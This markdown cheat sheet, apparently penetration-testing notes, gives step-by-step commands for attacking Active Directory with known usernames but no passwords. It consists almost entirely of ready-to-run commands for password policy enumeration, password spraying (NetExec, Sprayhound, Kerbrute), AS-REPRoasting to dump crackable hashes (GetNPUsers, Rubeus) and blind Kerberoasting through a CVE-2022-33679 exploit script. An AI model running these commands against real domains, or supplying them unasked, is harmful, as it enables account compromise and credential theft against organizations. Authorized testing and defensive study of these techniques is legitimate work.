# Active Directory Attacks - Valid User (No Password)

Techniques to exploit or escalate when you have a list of valid usernames but no passwords.
Focus: Password spraying (low-noise brute force) and AS-REPRoasting (pre-auth disabled accounts).

## Password Policy Enumeration (Critical First Step)

Always check the domain password policy first to avoid account lockouts during spraying.

### Default Domain Policy
```bash
# NetExec (requires valid creds for full info)
nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol


# PowerView / AD Module (from Windows host with creds)
Get-ADDefaultDomainPasswordPolicy


# ldeep (LDAP query)
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy
```
### Fine-Grained Password Policies (Privileged accounts)
```bash
# ldapsearch-ad (Impacket)
ldapsearch-ad.py --server <dc_ip> -d <domain> -u <user> -p <pass> --type pass-pols

# PowerView / AD Module
Get-ADFineGrainedPasswordPolicy -Filter *

# ldeep (works with low-priv but limited info)
ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso
```
### Password Spraying
User == Password Attempts
```bash
# NetExec (no bruteforce mode, continue on success)
nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success

# Sprayhound (focused on user=pass)
sprayhound -U <users.txt> -d <domain> -dc <dc_ip>
# Add --lower or --upper for case variations
```
### Common / Seasonal Passwords (SeasonYear!, Company123, etc.)
```bash
# Single password against user list
nxc smb <dc_ip> -u <users.txt> -p '<password>' --continue-on-success

# Sprayhound
sprayhound -U <users.txt> -p '<password>' -d <domain> -dc <dc_ip>

# Kerbrute (Kerberos-only spray)
kerbrute passwordspray -d <domain> --dc <dc_ip> <users.txt> '<password>'
```
### AS-REPRoasting 
Identify AS-REPRoastable Users (Pre-auth Disabled)
```bash
# BloodHound Cypher query
MATCH (u:User {dontreqpreauth: true, enabled: true}) RETURN u.name
```
### Perform AS-REPRoasting
```bash
# Impacket GetNPUsers (most common)
GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>

# NetExec
nxc ldap <dc_ip> -u '' -p '' --asreproast <output.txt>

# Rubeus (Windows)
Rubeus.exe asreproast /format:hashcat /outfile:<output.txt>
```
### Blind Kerberoasting (Using AS-REPRoastable Account)
```bash
CVE-2022-33679.py <domain>/<asrep_user> <target_ip>
```
